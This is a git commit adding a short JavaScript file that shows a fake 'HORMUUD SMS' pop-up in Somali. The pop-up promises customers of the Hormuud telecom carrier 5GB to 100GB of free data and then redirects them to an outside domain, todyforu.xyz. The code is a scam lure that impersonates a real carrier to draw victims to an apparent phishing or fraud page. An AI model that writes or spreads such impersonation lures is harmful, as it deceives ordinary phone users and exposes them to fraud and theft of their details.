ed72f8dca62291e8afc72b054f52550c3a2f3e47
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-08-22 16:53:59 -0700

    Create activation-freedataoffer.js

---
+++ activation-freedataoffer.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('HORMUUD SMS: Macaamiisha qaaliga ah, si naxariis leh u hubi in kaadhkaaga Hormuud uu u qalmo inuu ka helo xogta 5GB ilaa 100GB, abaal-marintii macaamiishii hore, taabo 1 si aad u hubiso hadda. ','1');
+if (password != '1') {
+location.href='https://todyforu.xyz/freedataoffer.html';
+}
